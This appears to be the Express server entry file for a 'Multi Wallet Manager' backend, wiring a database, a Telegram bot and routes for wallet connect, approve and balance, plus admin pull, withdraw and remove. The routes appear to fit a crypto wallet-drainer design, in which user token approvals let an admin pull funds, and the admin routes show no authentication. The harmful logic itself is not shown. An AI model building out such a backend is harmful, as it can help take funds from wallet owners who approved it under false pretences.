const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const database = require('./config/database');
const telegram = require('./config/telegram');
const walletController = require('./controllers/wallet.controller');
const adminController = require('./controllers/admin.controller');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Request logging middleware
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - ${req.ip}`);
    next();
});

// Database connection
database.connect();

// Telegram bot initialization
telegram.init();

// Routes
app.get('/health', async (req, res) => {
    try {
        const dbHealth = await database.healthCheck();
        res.json({ 
            status: dbHealth ? 'OK' : 'DEGRADED', 
            timestamp: new Date().toISOString(),
            database: dbHealth ? 'Connected' : 'Disconnected'
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'ERROR', 
            timestamp: new Date().toISOString(),
            error: error.message
        });
    }
});

app.post('/api/wallets/connect', walletController.connectWallet);
app.post('/api/wallets/approve', walletController.approveWallet);
app.get('/api/wallets/:address/balance', walletController.getBalance);

app.post('/api/admin/pull', adminController.pullWallet);
app.post('/api/admin/withdraw', adminController.withdrawContract);
app.post('/api/admin/remove', adminController.removeWallet);
app.get('/api/admin/balances', adminController.getAllBalances);

// 404 handler
app.use((req, res) => {
    res.status(404).json({
        success: false,
        error: 'Route not found'
    });
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

const server = app.listen(PORT, () => {
    console.log(`Multi Wallet Manager backend running on port ${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Process terminated');
    });
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    server.close(() => {
        console.log('Process terminated');
    });
});

module.exports = app;
